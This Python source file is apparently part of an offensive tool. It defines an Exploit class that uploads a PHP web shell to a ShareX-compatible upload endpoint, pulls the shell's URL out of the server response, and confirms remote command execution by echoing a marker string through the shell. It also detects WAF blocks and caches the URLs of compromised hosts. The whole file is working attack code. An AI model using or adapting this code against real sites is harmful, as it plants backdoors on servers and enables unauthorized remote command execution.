import re
import io

from core.sharex import ShareX
from core.logger import Logger
from core.cache import Cache
from core.shell import Shell


class Exploit:

    MAGIC = '5H311.php'

    @staticmethod
    def get_shell_url(res_body, target_url):
        """ Fetch shell URL from response body """
        re_shell_urls = re.findall(r'https?:\/\/?[\w/\-?=%.]+\.[\w/\-&?=%.]+', res_body)

        for res_url in re_shell_urls:
            if res_url.endswith('.php'):

                # fixes URL in case of misconfiguration in PHP file
                res_parts = [x for x in res_url.split('/') if len(x) > 0]
                res_path = '/'.join(res_parts[2:])

                target_parts = [x for x in target_url.split('/') if len(x) > 0]
                target_protocol = target_parts[0][:-1]
                target_host = target_parts[1]

                return f'{target_protocol}://{target_host}/{res_path}'
        else:
            Logger.error('web shell url not displayed in response body')

    @staticmethod
    def check(shell_url):
        """ Check if exploit is working """
        output = Shell.execute(shell_url, f'echo {Exploit.MAGIC}')
        return Exploit.MAGIC in output

    @staticmethod
    def upload_shell(upload_url, form_name, secret, field_name, verbose, cache_enabled):
        """ Upload shell to target site """
        res = ShareX.upload(upload_url, io.BytesIO(Shell.PAYLOAD.encode()), file_name=Exploit.MAGIC, form_name=form_name, secret=secret, field_name=field_name)

        res_code = res.status_code
        res_body = res.text.strip()

        if res.status_code != 200:
            if res_code == 403:
                Logger.error('target blocked file upload. waf?')

            elif res_code == 404:
                Logger.error('file upload endpoint not found')

            else:
                Logger.error('unknown response code')

        for error in ShareX.Errors:
            if error.value['content'].lower() in res_body.lower():
                reason = error.value['reason'].lower()
                Logger.error(f'failed to upload shell: \x1b[95m{reason}')

        shell_url = Exploit.get_shell_url(res_body, upload_url)

        if not Exploit.check(shell_url):
            Logger.error('target does not appear vulnerable')

        Logger.success('php web shell uploaded')

        if verbose:
            Logger.info(f'location: \x1b[95m{shell_url}')

        if cache_enabled:
            Cache.save(upload_url, shell_url)
            Logger.success('results saved to cache')
        
        return shell_url
